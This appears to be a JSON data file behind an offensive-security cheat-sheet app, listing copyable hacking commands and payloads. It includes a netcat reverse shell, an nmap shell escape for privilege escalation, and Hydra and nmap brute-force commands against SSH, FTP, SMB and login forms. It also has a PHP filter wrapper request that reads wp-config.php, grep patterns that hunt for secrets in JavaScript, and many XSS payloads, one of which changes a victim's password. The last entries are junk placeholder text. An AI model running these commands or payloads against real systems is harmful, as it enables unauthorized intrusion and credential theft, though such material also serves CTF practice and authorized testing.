[
  {
    "id": 1,
    "title": "connect with ssh",
    "content": "change file mode <br> <copycode>chmod id_rsa 600</copycode> <br> connect ssh with id_rsa <br><copycode>ssh user@ -i id_rsa</copycode>",
    "keywords": [
      "connect",
      "ssh",
      "sshkey",
      "id_rsa",
      "rce",
      "reverse shell"
    ],
    "category": "commands"
  },
  {
    "id": 2,
    "title": " crt.sh web scraping using grep command.",
    "content": "<copycode>\ncurl -s https://crt.sh/\\?q\\=%25.example.com\\&output\\=json | jq . | grep 'name_value' | awk '{print $2}' | sed -e 's/\"//g'| sed -e 's/,//g' |  awk '{gsub(/\\\\n/,\"\\n\")}1' | sort -u \n</copycode>",
    "keywords": [
      "crt.sh",
      "filter",
      "subdomains",
      "grep",
      "curl"
    ],
    "category": "commands"
  },
  {
    "id": 3,
    "title": "CTFs and labs",
    "content": "HackThisSite <br>\nHackinghub<br>\nHackingplaning<br>\nportswigger academy<br>\nAlert 1 to win - XSS<br>\nPrompt.ml - XSS<br>\nXSS-game<br>\nVulnhub.com<br>\nW3challs.com<br>\nPicoCTF<br>\nRoot-me.org<br>\nOverthewire<br>\nXSS from pwnfunction<br>\nxss lab<br>",
    "keywords": [
      "ctf",
      "website",
      "xss",
      "labs",
      "hacking",
      "xss labs"
    ],
    "category": "CTF"
  },
  {
    "id": 4,
    "title": "filter wordlist, sorting wordlist",
    "content": "for ftp bruteforce<br>\n\n<copycode>grep -E '^.{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:alnum:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:alpha:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:upper:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:lower:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:digit:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>",
    "keywords": [
      "filter",
      "sorting",
      "wordlist",
      "rockyou",
      "grep -e"
    ],
    "category": "commands"
  },
  {
    "id": 5,
    "title": "Search flag in whole directory",
    "content": "<copycode>\ngrep -nr \"picoCTF\"\n</copycode>",
    "keywords": [
      "find",
      "flag",
      "grep",
      "whole",
      "directory",
      "search flag",
      "ctf"
    ],
    "category": "commands"
  },
  {
    "id": 6,
    "title": "hydra FTP brute-force",
    "content": "<copycode>\nhydra -l username -p password ftp://IPV4/..\n</copycode>\n<br>\n<copycode>\nhydra -L username.txt -P pass.txt ftp://IPV4/...\n</copycode>",
    "keywords": [
      "hydra",
      "ftp",
      "bruteforce"
    ],
    "category": "commands"
  },
  {
    "id": 7,
    "title": "gobuster subdomain gathering(active scan)",
    "content": "<copycode>\ngobuster dns -d example.com -w word_list.txt\n</copycode>\n<br>\n<copycode>\ngobuster dns -d example.com -w word_list.txt -i\n</copycode>\n<br>\ni - ip address",
    "keywords": [
      "gobuster",
      "subdomain",
      "enum",
      "information gathering"
    ],
    "category": "commands"
  },
  {
    "id": 8,
    "title": "install .tar file in linux",
    "content": "<copycode>tar -xvf filename.tar </copycode>",
    "keywords": [
      "install",
      "tar",
      "linux",
      "kali linux"
    ],
    "category": "commands"
  },
  {
    "id": 9,
    "title": "find all JS files",
    "content": "<copycode>\nkatana -u sub.domain.com\n</copycode><br>\n<copycode>\nkatana -u domain.com > website_all_js_files.txt\n</copycode>\n<br>\nfind secret info\n<br>\n<copycode>\ncat website_all_js_files.txt | while read url; do python3 SecretFinder.py -i $url -o cli; done\n</copycode>",
    "keywords": [
      "katana",
      "find js",
      "disclosure",
      "secret finder"
    ],
    "category": "commands"
  },
  {
    "id": 10,
    "title": "Convert md5 hashing",
    "content": "<copycode>\nfor word in $(cat wordlist.txt); do echo -n \"$word\" | md5sum | awk '{print $1}' >> md5.txt; done\n</copycode>",
    "keywords": [
      "md5",
      "hashing",
      "convert"
    ],
    "category": "commands"
  },
  {
    "id": 11,
    "title": "Netcat remote access",
    "content": "victim site<br>\n<copycode>\nnc host port -e /bin/bash\n</copycode>\n<br>\nour site\n<copycode>\nnc -lvnp port_number\n</copycode>",
    "keywords": [
      "netcat",
      "remote",
      "access",
      "/bin/bash",
      "reverse shell"
    ],
    "category": "commands"
  },
  {
    "id": 12,
    "title": "nmap privilege escalation",
    "content": "<copycode>\nnmap --interactive <br>\nnmap>!sh\n</copycode>\n",
    "keywords": [
      "nmap",
      "privilege",
      "escalation"
    ],
    "category": "commands"
  },
  {
    "id": 13,
    "title": "private bug bounty program",
    "content": "<copycode>\ninurl:/bugbounty insite:lk\n</copycode>",
    "keywords": [
      "private",
      "bugbounty",
      "program",
      "bbp",
      "dorks"
    ],
    "category": "commands"
  },
  {
    "id": 14,
    "title": "privilege escalation find SUID files",
    "content": "<copycode>\nfind / -perm -u=s -type f 2>/dev/null\n</copycode><br>\n<copycode>\nfind / -perm -g=s -type f 2>/dev/null\n</copycode><br>\n<copycode>\nfind / -perm -g=s -o -perm -u=s -type f 2>/dev/null\n</copycode><br>\n<copycode>\nfind /home -writable -type d 2>/dev/null\n</copycode><br>\n<copycode>\nfind . -type f -perm 0777 -print\n</copycode>",
    "keywords": [
      "privilege escalation",
      "find",
      "suid",
      "super user",
      "gtfobin"
    ],
    "category": "commands"
  },
  {
    "id": 15,
    "title": "Python HTTP server",
    "content": "start python http server<br>\n<copycode>\npython -m http.server port_num\n</copycode>",
    "keywords": [
      "python",
      "http",
      "server"
    ],
    "category": "commands"
  },
  {
    "id": 16,
    "title": "python setup.py install and requirements.txt ",
    "content": "<copycode>\npython setup.py install<br>\npython3 setup.py install\n</copycode><br>\n<copycode>\npython setup.py install<br>\npython3 setup.py install\n</copycode>",
    "keywords": [
      "requirements.txt",
      "install",
      "setup.py",
      "python"
    ],
    "category": "commands"
  },
  {
    "id": 17,
    "title": "subfinder subdomain gather",
    "content": "<copycode>\nsubfinder -d example.com\n</copycode>",
    "keywords": [
      "subfinder"
    ],
    "category": "commands"
  },
  {
    "id": 18,
    "title": "subbrute",
    "content": "<copycode>\npython3 subbrute.py -p example.com -c 16 \n</copycode>\n<br>\n-p : optional (DNS records)<br>\n-c : threads (max 16)\n\n",
    "keywords": [
      "subbrute"
    ],
    "category": "commands"
  },
  {
    "id": 19,
    "title": "assetfinder",
    "content": "<copycode>\nassetfinder --subs-only example.com\n</copycode>",
    "keywords": [
      "assetfinder"
    ],
    "category": "commands"
  },
  {
    "id": 20,
    "title": "upgrading pty with python",
    "content": "<copycode>\npython -c 'import pty;pty.spawn('/bin/bash')'\n</copycode>",
    "keywords": [
      "upgrading",
      "tty",
      "pty",
      "putty"
    ],
    "category": "commands"
  },
  {
    "id": 21,
    "title": "finding subdomain takeover vuln",
    "content": "<copycode>subfinder -d example.com -v -o output_subdomains.txt</copycode><br>\n<copycode>subzy run --targets example_subdomains.txt --hide_fails</copycode>\n<br>\n\n--tragets => is taget subdomain wordlist<br>\n--hide_fails => show only vulnerable domains",
    "keywords": [
      "subzy",
      "subdomain",
      "takeover",
      "subfinder"
    ],
    "category": "commands"
  },
  {
    "id": 22,
    "title": "Search flag in whole directory",
    "content": "<copycode>\ngrep -nr \"picoCTF\"<br>\ngrep -nr \"flag\"<br>\ngrep -nr \"THM\"  //its search text or words in whole directoty<br>\n</copycode>\n<br>\nsearching file name in current directory",
    "keywords": [
      "Search",
      "flag",
      "whole",
      "directory",
      "ctf",
      "grep"
    ],
    "category": "commands"
  },
  {
    "id": 23,
    "title": "google Dork private bugbounty program",
    "content": "  <copycode>\n  inurl: /bugbounty insite:lk<br>\n  site:.lk \"bug bounty program\"<br>\n  site:.lk \"bug bounty program\" OR \"security vulnerability reward\"<br>\n  site:.lk \"security disclosure\" OR \"vulnerability disclosure\"<br>\n  site:.lk \"vulnerability disclosure policy\"<br>\n  site:.lk \"report vulnerability\" OR \"security researcher\" OR \"responsible disclosure\"<br>\n  site:.lk \"report vulnerability\" OR \"security researcher reward\"<br>\n  site:.lk inurl:bugbounty OR inurl:security<br>\n  site:.lk inurl:bugbounty OR inurl:disclosure<br>\n  site:.lk \"cybersecurity initiative\" OR \"bug bounty\" OR \"disclosure program\"<br>\n  site:.lk \"cybersecurity initiative\" OR \"security disclosure\" OR \"bug bounty\"<br>\n  inurl /bug bounty<br>\n  inurl : / security<br>\n  inurl:security.txt<br>\n  inurl:security \"reward\"<br>\n  inurl : /responsible disclosure<br>\n  inurl : /responsible-disclosure/ reward<br>\n  inurl : / responsible-disclosure/ swag<br>\n  inurl : / responsible-disclosure/ bounty<br>\n  inurl:'/responsible disclosure' hoodie<br>\n  responsible disclosure swag r=h:com<br>\n  responsible disclosure hall of fame<br>\n  inurl:responsible disclosure $50<br>\n  responsible disclosure europe<br>\n  responsible disclosure white hat<br>\n  white hat program<br>\n  insite:\"responsible disclosure\" -inurl:nl<br>\n  intext responsible disclosure<br>\n  site eu responsible disclosure<br>\n  site .nl responsible disclosure<br>\n  site responsible disclosure<br>\n  responsible disclosure:sites<br>\n  responsible disclosure r=h:nl<br>\n  responsible disclosure r=h:uk<br>\n  responsible disclosure r=h:eu<br>\n  responsible disclosure bounty r=h:nl<br>\n  responsible disclosure bounty r=h:uk<br>\n  responsible disclosure bounty r=h:eu<br>\n  responsible disclosure swag r=h:nl<br>\n  responsible disclosure swag r=h:uk<br>\n  responsible disclosure swag r=h:eu<br>\n  responsible disclosure reward r=h:nl<br>\n  responsible disclosure reward r=h:uk<br>\n  responsible disclosure reward r=h:eu<br>\n  \"powered by bugcrowd\" -site:bugcrowd.com<br>\n  \"submit vulnerability report\"<br>\n  \"submit vulnerability report\" | \"powered by bugcrowd\" | \"powered by hackerone\"<br>\n  site:*.gov.* \"responsible disclosure\"<br>\n  intext:\"we take security very seriously\"<br>\n  site:responsibledisclosure.com<br>\n  inurl:'vulnerability-disclosure-policy' reward<br>\n  intext:Vulnerability Disclosure site:nl<br>\n  intext:Vulnerability Disclosure site:eu<br>\n  site:*.*.nl intext:security report reward<br>\n  site:*.*.nl intext:responsible disclosure reward<br>\n  \"security vulnerability\" \"report\"<br>\n  inurl\"security report\"<br>\n  \"responsible disclosure\" university<br>\n  inurl:/responsible-disclosure/ university<br>\n  buy bitcoins \"bug bounty\"<br>\n  inurl:/security ext:txt \"contact\"<br>\n  \"powered by synack\"<br>\n  intext:responsible disclosure bounty<br>\n  inurl: private bugbountyprogram<br>\n  inurl:/.well-known/security ext:txt<br>\n  inurl:/.well-known/security ext:txt intext:hackerone<br>\n  inurl:/.well-known/security ext:txt -hackerone -bugcrowd -synack -openbugbounty<br>\n  inurl:reporting-security-issues<br>\n  inurl:security-policy.txt ext:txt<br>\n  site:*.*.* inurl:bug inurl:bounty<br>\n  site:help.*.* inurl:bounty<br>\n  site:support.*.* intext:security report reward<br>\n  intext:security report monetary inurl:security<br>\n  intext:security report reward inurl:report<br>\n  site:security.*.* inurl: bounty<br>\n  site:*.*.de inurl:bug inurl:bounty<br>\n  site:*.*.uk intext:security report reward<br>\n  site:*.*.cn intext:security report reward<br>\n  \"vulnerability reporting policy\"<br>\n  \"van de melding met een minimum van een\" -site:responsibledisclosure.nl<br>\n  inurl:responsible-disclosure-policy<br>\n  \"If you believe you've found a security vulnerability\"<br>\n  intext:\"BugBounty\" and intext:\"BTC\" and intext:\"reward\"<br>\n  intext:bounty inurl:/security<br>\n  inurl:\"bug bounty\" and intext:\"\u20ac\" and inurl:/security<br>\n  inurl:\"bug bounty\" and intext:\"$\" and inurl:/security<br>\n  inurl:\"bug bounty\" and intext:\"INR\" and inurl:/security<br>\n  inurl:/security.txt \"mailto*\" -github.com  -wikipedia.org -portswigger.net -magento<br>\n  /trust/report-a-vulnerability<br>\n  site:*.edu intext:security report vulnerability<br>\n  \"cms\" bug bounty<br>\n  \"If you find a security issue\"  \"reward\"<br>\n  \"responsible disclosure\" intext:\"you may be eligible for monetary compensation\"<br>\n  inurl: \"responsible disclosure\", \"bug bounty\", \"bugbounty\"<br>\n  intext: we offer a bounty<br>\n  responsible disclosure inurl:in<br>\n  site:*.br responsible disclosure<br>\n  site:*.at responsible disclosure<br>\n  site:*.be responsible disclosure<br>\n  site:*.au responsible disclosure<br>\n  site:*/security.txt \"bounty\"<br>\n  inurl:bug bounty intext:\"rupees\"<br>\n  inurl:bug bounty intext:\"\u20b9\"<br>\n  inurl:responsible disclosure intext:\"INR\"<br>\n</copycode>",
    "keywords": [
      "google",
      "dorks",
      "private",
      "bug bounty"
    ],
    "category": "commands"
  },
  {
    "id": 24,
    "title": "find sensitive information or bugs in javascript files (katana, neclei)",
    "content": "<copycode>\n/// getting all the js files<br>\n  cat domains.txt | katana | grep js | httpx -mc 200 | tee js.txt<br>\n  -----------------------------------------------------------------------<br>\n  /// find any bugs in javascript files<br>\n  nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_bugs.txt<br>\n  -----------------------------------------------------------------------<br>\n  /// find sensitive information in JS files<br>\n\n  file=\"js.txt\"<br>\n  # Loop through each line in the file<br>\n  while IFS= read -r link<br>\n  do<br>\n      # Download the JavaScript file using wget<br>\n      wget \"$link\"<br>\n  done < \"$file\"<br>\n  -----------------------------------------------------------------------<br>\n  //grep command for find api,passwords,.....<br>\n\n  grep -r -E \"aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp\" *.js<br>\n\n</copycode>\n",
    "keywords": [
      "find",
      "sensitive",
      "info",
      "bug",
      "in js",
      "javascript",
      "nuclei",
      "exposure",
      "katana"
    ],
    "category": "commands"
  },
  {
    "id": 25,
    "title": "cat all the text file in current directory (it help to find a flag using grap)",
    "content": "<copycode><br>\n  for file in $(find /path/to/your/directory -type f -name \"*.txt\"); do<br>\n      cat \"$file\"<br>\n  done<br>\n</copycode>",
    "keywords": [
      "cat",
      "all file",
      "in current directory",
      "see all the text file",
      "view al the text file"
    ],
    "category": "commands"
  },
  {
    "id": 26,
    "title": "hash identify (identify hash types)",
    "content": "<copycode>\ngem install haiti-hash<br>\nhaiti hasing_value\n</copycode>\n<br>\n<copycode>\nsudo apt install hashid<br>\nhashid hash_value\n</coycode>\n<br>\n<copycode>\ngit clone https://github.com/blackploit/hash-identifier.git<br>\ncd hash-identifier<br>\npython hash-identifier.py\n</copycode>",
    "keywords": [
      "hashid",
      "haiti",
      "identify",
      "hash types"
    ],
    "category": "commands"
  },
  {
    "id": 27,
    "title": "hydra commands for brute-force",
    "content": "ssh brute-force<br>\n<copycode>\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10\n</copycode><br>\nHTTP POST form brute force<br>\n<copycode>\nhydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -t 4 10.10.10.10 http-post-form \"/login:username=^USER^&password=^PASS^:Invalid login\"\n</copycode>\n<br>\nFTP brute-force<br>\n<copycode>\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10\n</copycode>",
    "keywords": [
      "hydra",
      "commands",
      "bruteforce",
      "login",
      "form"
    ],
    "category": "commands"
  },
  {
    "id": 28,
    "title": "SSH Password Brute Force with Nmap",
    "content": "<copycode>\nnmap --script ssh-brute -p 22 <target-IP>\n</copycode>",
    "keywords": [
      "nmap",
      "ssh",
      "bruteforce",
      "script"
    ],
    "category": "commands"
  },
  {
    "id": 29,
    "title": "FTP Password Brute Force with Nmap",
    "content": "<copycode>\nnmap --script ftp-brute -p 21 <target-IP>\n</copycode>",
    "keywords": [
      "nmap",
      "password",
      "bruteforce",
      "ftp",
      "script"
    ],
    "category": "commands"
  },
  {
    "id": 30,
    "title": "finding file type",
    "content": "<copycode>\nfile  file_name\n</copycode>",
    "keywords": [
      "find",
      "file",
      "types"
    ],
    "category": "commands"
  },
  {
    "id": 31,
    "title": "decode base64 ",
    "content": "<copycode>\necho 'base64_value' | base64 -d<br>\nor<br>\ncat  bash64.txt | base64 -d\n</copycode>",
    "keywords": [
      "decode",
      "base64",
      "to text"
    ],
    "category": "commands"
  },
  {
    "id": 32,
    "title": "sort and uniq (avoid deduplicate data)",
    "content": "<copycode>\ncat file.txt | sort | uniq<br>\ncat file.hd | xargs -n1 | sort | uniq -c\n</copycode>",
    "keywords": [
      "deduplicate",
      "data",
      "uniq",
      "sort",
      "filter",
      "xargs"
    ],
    "category": "commands"
  },
  {
    "id": 33,
    "title": "SMB commands",
    "content": "See what shares are on the host<br>\n<copycode>smbclient -L $IP<br>\nsmbmap -H $IP<br>\nnmap --script smb-enum-shares -p139 $IP</copycode><br>\nConnect<br>\n<copycode>smbclient //$IP/<sharename><br>\nsmbclient //$IP/<sharename> -U <username> <password></copycode><br>\nMount<br>\n<copycode>mount.cifs //$IP/<sharename>/  /mnt/shares/<sharename> -o username=<user>,pass=<password></copycode><br>\nUpload<br>\n<copycode>curl --upload-file <file> -u '<user>' smb://$IP/<sharename>/</copycode><br>\nBrute<br>\n<copycode>hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $IP smb</copycode>",
    "keywords": [
      "smp",
      "commands",
      "upload",
      "connect",
      "brute",
      "shares"
    ],
    "category": "commands"
  },
  {
    "id": 34,
    "title": "rustscan (enumerating ports with Rustscan)",
    "content": "<copycode>\nsudo rustscan -a 10.10.29.138 -- -sV -sC -A -vvvv --script=vuln\n</copycode>",
    "keywords": [
      "rustscan",
      "ports",
      "enum"
    ],
    "category": "commands"
  },
  {
    "id": 35,
    "title": " PHP Wrappers (if enabled) , access manipulation, bypass restrictions",
    "content": "If the server has PHP wrappers enabled, use them to bypass restrictions. For example, use the<br>\n php://filter wrapper to base64 encode the output and avoid detection:<br>\n<copycode>\nhttp://10.10.145.93/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php\n</copycode>\n<br>\n<copycode>\necho \"BASE64_CONTENT\" | base64 -d\n</copycode>",
    "keywords": [
      "php",
      "wrapper",
      "wordress",
      "access",
      "manipulation",
      "bypass",
      "restriction"
    ],
    "category": "commands"
  },
  {
    "id": 36,
    "title": "wpscan commands",
    "content": "Scan a WordPress Website:<br>\n<copycode>\nwpscan --url https://example.com\n</copycode><br>\nUse an API Token for Vulnerability Data:<br>\n<copycode>\nwpscan --url https://example.com --api-token YOUR_TOKEN\n</copycode><br>\nScan for Vulnerable Plugins:<br>\n<copycode>wpscan --url https://example.com --enumerate p</copycode><br>\nScan for Vulnerable Themes:<br>\n<copycode>wpscan --url https://example.com --enumerate t</copycode><br>\nScan for WordPress Users<br>\n<copycode>\nwpscan --url https://example.com --enumerate u\n<copycode><br>\nCustomizing the Timeout (useful for slow servers):<br>\n<copycode>\nwpscan --url https://example.com --request-timeout 60\n</copycode><br>\nEnable Verbose Mode (for detailed output):<br>\n<copycode>\nwpscan --url https://example.com --verbose\n</copycode>",
    "keywords": [
      "wpscan",
      "commands"
    ],
    "category": "commands"
  },
  {
    "id": 37,
    "title": "XSS (Cross-Site Scripting) Automation",
    "content": "Dalfox\n<copycode>\n# -b: Callback url <br> dalfox url https://example.com/?q=test -b http://<attack-ip>:<attack-port><br>\n<br>\n# -X: Method<br>\n# --data: POST data<br>\ndalfox url https://example.com/contact -X POST --data \"email=test&message=test\" -b http://<attack-ip>:<attack-port><br>\n</copycode><br>\nXSStrike<br>\n<copycode>\n# GET request<br>\npython xsstrike.py -u http://vulnerable.com/?param=test<br>\n<br>\n# POST reqeust<br>\npython xsstrike.py -u http://vulnerable.com/post --data \"username=test&email=test&comment=test\"<br>\n<br>\n# data as JSON<br>\npython xsstrike.py -u http://vulnerable.com/comment --data '{\"comment\": \"test\"}' --json<br>\n</copycode><br>\n",
    "keywords": [
      "xss",
      "automation",
      "xss tool",
      "xsstrike",
      "dalfox"
    ],
    "category": "xss"
  },
  {
    "id": 38,
    "title": "XSS payloads script tag",
    "content": "<copycode>\n<script>alert(1)</script><br>\n\"><script>alert(1)</script><br>\n'></script><script>alert(1)</script><br>\n<script>onerror=alert;throw 123</script><br>\n<script>{onerror=alert}throw 123</script><br>\n<script>throw onerror=alert,'hello',123,'world'</script><br>\n<script>fetch('/profile?new_password=password');</script><br>\n</textarea><script>alert(1)</script><br>\n<br>\n%3Cscript%3Ealert%281%29%3C%2Fscript%3E<br>\n<br>\n%0D%0A<script>alert(1)</script><br>\n%0D%0A%0D%0A<script>alert(1)</script><br>\n<br>\n';alert(1);'<br>\n\n</copycode>",
    "keywords": [
      "xss",
      "payloads",
      "script",
      "tag"
    ],
    "category": "xss"
  },
  {
    "id": 39,
    "title": "XSS payloads,  Img Tags",
    "content": "<copycode><br>\n\" src=1 onerror=alert(1)><br>\n<><img src=1 onerror=alert(1)><br>\n\"><img src=1 onerror=alert(1)><br>\n\"></span><img src=1 onerror=alert(1)><br>\n<br>\n<img src=\"javascript:alert(1)\"><br>\n<img src=\"jav ascript:alert(1)\"><br>\n<img src=\"jav&#x09;ascript:alert(1)\"><br>\n<img src=\"jav&#x0A;ascript:alert(1)\"><br>\n<br>\n<img dynsrc=\"javascript:alert(1)\"><br>\n<img lowsrc=\"javascript:alert(1)\"><br>\n<br>\n<img src=http://10.0.0.1/><br>\n<br>\n</copycode>",
    "keywords": [
      "xss",
      "payloads",
      "img",
      "image",
      "tag"
    ],
    "category": "xss"
  },
  {
    "id": 40,
    "title": "xss payload SVG tag",
    "content": "<copycode><br>\n\"><svg onload=alert(1)><br>\n<svg onmouseover=\"alert(1)\"></svg><br>\n<svg><animatetransform onclick=\"alert(1)\"></svg><br>\n<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a><br>\n</copycode>",
    "keywords": [
      "xss",
      "payload",
      "svg",
      "tag"
    ],
    "category": "xss"
  },
  {
    "id": 41,
    "title": "xss input tag",
    "content": "<copycode>\n<input autofocus onfocus=alert(1)>\n</copycode>",
    "keywords": [
      "xss",
      "payload",
      "input",
      "tag"
    ],
    "category": "xss"
  },
  {
    "id": 42,
    "title": "xss payload select tag",
    "content": "<copycode>\n<select autofocus onfocus=alert(1)>\n</copycode>\n",
    "keywords": [
      "xss",
      "payload",
      "select",
      "tag"
    ],
    "category": "xss"
  },
  {
    "id": 43,
    "title": "xss, payload, anchor tag",
    "content": "<copycode><a onmouseover=alert(1)>click</a>\n<a href=\"javascript:alert(1)\">Click</a><br>\n</copycode>",
    "keywords": [
      "xss",
      "payload",
      "anchor",
      "tag"
    ],
    "category": "xss"
  },
  {
    "id": 44,
    "title": "xss Iframe tags",
    "content": "<copycode>\n<iframe src=\"javascript:alert(1)\"></iframe><br>\n<iframe src=http://10.0.0.1:8000/xss.js></iframe><br>\n<iframe onload=alert(1)></iframe><br>\n</copycode>",
    "keywords": [
      "xss",
      "Iframe",
      "tags",
      "payload"
    ],
    "category": "xss"
  },
  {
    "id": 45,
    "title": "xss body tag",
    "content": "<copycode>\n<body onload=alert(/XSS/.source)><br>\n<body background=\"javascript:alert(1)\"><br>\n</copycode>",
    "keywords": [
      "xss",
      "body",
      "tag",
      "payloads"
    ],
    "category": "xss"
  },
  {
    "id": 46,
    "title": "XSS HTML Entity",
    "content": "<copycode>\n<!-- <img src=javascript:alert('XSS')> --><br>\n<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041><br>\n<br>\n<!-- onerror=\"javascript:alert('XSS')\" --><br>\n<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\"><br>\n<br>\n</copycode>",
    "keywords": [
      "xss",
      "payloads",
      "html",
      "entity"
    ],
    "category": "xss"
  },
  {
    "id": 47,
    "title": "other some xss payloads",
    "content": "<copycode>\n\" onmouseleave='alert(1)'\"><br>\n<br>\njavascript:alert(1)<br>\n\\\"-alert(1)//<br>\n<br>\n/?q=&subparam=--><script>alert(1)</script><br>\n/index.php#value='><script>alert(1)</script><br>\n</copycode>",
    "keywords": [
      "xss",
      "payloads",
      "script"
    ],
    "category": "xss"
  },
  {
    "id": 48,
    "title": "test",
    "content": "test\njhdjhskldsajjk\n././918712324=-32kl23\"e/'dlw=-dosd90sdl\n]'sdsal;du90e823ew\nD?Wd@!#@#$#TR ./vrfjer\nr345#$%@#rl234\n34\n1\ne#r34243r34r#$R$%T$%Y^%U^&I&*@@!@!@@!~~!~!32\ne2e\n23434\n534564565445\n75635l345j6eiofevejkdvdkw\\]",
    "keywords": [
      "test"
    ],
    "category": "test"
  },
  {
    "id": 49,
    "title": "test 2",
    "content": "<copycode>dksdksdsd\n<br>sdsdksds\ndskjkads\n\nsjdjdjhsd: djksdsjk&quot;\n <br>      sdjsjdsdhsksjdsjk\nskjjkasdjlksakl\nsd\n\ndsoadhkjdklasdkssdsd\nkksdlkasds\nasdsajkdadwui9dskladms\nsdbsajks   \\\nssdsdssal\n <br>       osdjkadjksdjkas\n                  ksjdhasjlajdlasdjsdispas\n                            adhiasdhsidjopsadjsads\n                                       jsdssjsjgasakaisdjsadshjdsad\nsdsdisdbjksadbsds\nadsjadjksds\nsdsadkajdakjdskadkad\n                  jdasdjlsadsajdsassdsiaa\n                                  djosadjksdsjkadsajshdsadsp\n                                              dsjiodjsdjklsjlksjslds\n                                                            sodjsadjksdsdsa\n                                                                       iosdjoasidjajsajsa <br> ducky</copycode>",
    "keywords": [
      "test2"
    ],
    "category": "test2"
  },
  {
    "id": 50,
    "title": "test3",
    "content": "&quot;-prompt(8)-&quot;\n&#x27;-prompt(8)-&#x27;\n&quot;;a=prompt,a()//\n&#x27;;a=prompt,a()//\n&#x27;-eval(&quot;window[&#x27;pro&#x27;%2B&#x27;mpt&#x27;](8)&quot;)-&#x27;\n&quot;-eval(&quot;window[&#x27;pro&#x27;%2B&#x27;mpt&#x27;](8)&quot;)-&quot;\n&quot;onclick=prompt(8)&gt;&quot;@x.y\n&quot;onclick=prompt(8)&gt;&lt;svg/onload=prompt(8)&gt;&quot;@x.y\n&lt;image/src/onerror=prompt(8)&gt;\n&lt;img/src/onerror=prompt(8)&gt;\n&lt;image src/onerror=prompt(8)&gt;\n&lt;img src/onerror=prompt(8)&gt;\n&lt;image src =q onerror=prompt(8)&gt;\n&lt;img src =q onerror=prompt(8)&gt;\n&lt;/scrip&lt;/script&gt;t&gt;&lt;img src =q onerror=prompt(8)&gt;\n&lt;script\\x20type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;",
    "keywords": [
      "test3"
    ],
    "category": "test3"
  },
  {
    "id": 51,
    "title": "test3",
    "content": "tksjjks]sdjkfsklads[\n\nd;osds&#x27;adsd\nsadsd&#x27;sad\nadsads\nDSADSJADPASDSADSAKDS\nASJKDALDS\nAADASDNJKLA",
    "keywords": [
      "test3"
    ],
    "category": "test3"
  },
  {
    "id": 52,
    "title": "test11",
    "content": "test11",
    "keywords": [
      "test11"
    ],
    "category": "test11"
  },
  {
    "id": 53,
    "title": "test11",
    "content": "test11",
    "keywords": [
      "test11"
    ],
    "category": "test11"
  }
]